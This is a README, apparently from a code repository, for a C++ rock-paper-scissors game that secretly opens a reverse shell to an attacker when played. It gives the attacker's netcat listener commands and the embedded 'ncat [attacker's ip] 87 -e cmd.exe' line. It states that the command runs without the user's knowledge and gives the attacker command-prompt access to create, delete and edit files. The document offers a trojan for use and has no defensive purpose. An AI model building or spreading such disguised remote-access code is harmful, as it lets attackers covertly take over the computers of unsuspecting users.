# Rock-paper-scissor
This is a rock paper scissor game written in c++ that uses reverse shell to establish connection back to attacker's machine from the target machine.

# Get-started
### Attacker's machine

linux: `nc -lnvp 87`
windows: `ncat -lnvp 87` 
<p><b>NB</b>: 87 is the port number used for listening to incoming connections,</p>

### Target's machine

windows: `ncat [attacker's ip] 87 -e cmd.exe`
<p><b>NB</b>: The command to be executed are embedded in the game and are for windows users who have ncat installed already.</P>

### How it works

The attacker execute the above command to listen for incoming connection and when the user on the target machine opens the game 
and start to play the commands execute themselves without the user acknowledgement and an attacker get connected to target machine and gain access 
to the command prompt. After that, the attacker can carry out some operations to the targeted computer like create files, delete files, edit files,...

### Play The Game

To play the rock,paper,scissor game you first click on the executable file and then follow the instructions required to play the game
that are prompted after clicking on the executable file.
